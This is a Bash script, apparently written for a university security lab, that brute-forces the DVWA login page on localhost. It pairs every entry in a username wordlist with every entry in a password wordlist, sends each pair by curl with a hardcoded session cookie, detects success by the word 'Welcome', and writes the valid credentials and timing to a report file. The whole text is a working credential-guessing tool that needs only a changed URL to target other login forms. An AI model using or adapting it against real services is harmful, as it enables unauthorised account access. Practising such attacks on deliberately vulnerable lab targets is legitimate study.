#!/bin/bash

# ==========================================
# CONFIGURACIÓN DEL ATAQUE
# ==========================================
PHPSESSID="e85e601283e3b30636487e6d4c5613e9"

URL_BASE="http://localhost:8806/vulnerabilities/brute/"
ARCHIVO_USUARIOS=~/Documents/temp/lab2cripto/informe/dics/u.txt
ARCHIVO_PASSWORDS=~/Documents/temp/lab2cripto/informe/dics/p.txt
ARCHIVO_RESULTADOS="$(dirname "$0")/resultados4.txt"

# ==========================================
# INICIO
# ==========================================
echo "=== DVWA cURL Brute Force ==="
echo "[*] PHPSESSID: $PHPSESSID"
echo "[*] Iniciando ataque..."
echo ""

INICIO=$(date +%s%N)
ITERACIONES=0
declare -a PARES_VALIDOS

# ==========================================
# DOBLE BUCLE: usuario x password
# ==========================================
while IFS= read -r USUARIO || [[ -n "$USUARIO" ]]; do
    # Saltar líneas vacías
    [[ -z "$USUARIO" ]] && continue

    while IFS= read -r PASSWORD || [[ -n "$PASSWORD" ]]; do
        # Saltar líneas vacías
        [[ -z "$PASSWORD" ]] && continue

        ITERACIONES=$((ITERACIONES + 1))

        # Mostrar progreso en la misma línea
        printf "\rProbando iteración %d: %s:%s          " "$ITERACIONES" "$USUARIO" "$PASSWORD"

        # Petición GET con cURL
        RESPUESTA=$(curl -s -G "$URL_BASE" \
            --data-urlencode "username=$USUARIO" \
            --data-urlencode "password=$PASSWORD" \
            --data-urlencode "Login=Login" \
            -b "security=low; PHPSESSID=$PHPSESSID")

        # Verificar si la respuesta contiene "Welcome"
        if echo "$RESPUESTA" | grep -q "Welcome"; then
            printf "\n[+] ¡BINGO! Usuario: %-12s | Password: %s\n" "$USUARIO" "$PASSWORD"
            PARES_VALIDOS+=("Usuario: $USUARIO | Password: $PASSWORD")
        fi

    done < "$ARCHIVO_PASSWORDS"
done < "$ARCHIVO_USUARIOS"

# ==========================================
# CÁLCULO DE TIEMPO
# ==========================================
FIN=$(date +%s%N)
DURACION_NS=$((FIN - INICIO))
DURACION_SEG=$(echo "scale=3; $DURACION_NS / 1000000000" | bc)

echo ""
echo ""
echo "[*] Ataque finalizado."
echo "[*] Iteraciones totales: $ITERACIONES"
echo "[*] Tiempo total de ejecución: ${DURACION_SEG} segundos"

# ==========================================
# GUARDAR RESULTADOS (crea o reemplaza)
# ==========================================
{
    echo "=== REPORTE DE ATAQUE FUERZA BRUTA (cURL) ==="
    echo "Iteraciones totales realizadas: $ITERACIONES"
    echo "Tiempo total de ejecución: ${DURACION_SEG} segundos"
    echo "----------------------------------------"
    echo "CABECERAS HTTP UTILIZADAS EN EL ATAQUE:"
    echo "  User-Agent: curl/$(curl --version | head -1 | awk '{print $2}')"
    echo "  Accept: */*"
    echo "  Cookie: security=low; PHPSESSID=$PHPSESSID"
    echo "----------------------------------------"
    echo "PARES VÁLIDOS ENCONTRADOS:"

    if [[ ${#PARES_VALIDOS[@]} -eq 0 ]]; then
        echo "No se encontraron credenciales válidas o la sesión expiró."
    else
        for PAR in "${PARES_VALIDOS[@]}"; do
            echo "  $PAR"
        done
    fi
} > "$ARCHIVO_RESULTADOS"

echo "[+] Resultados guardados en: $ARCHIVO_RESULTADOS"
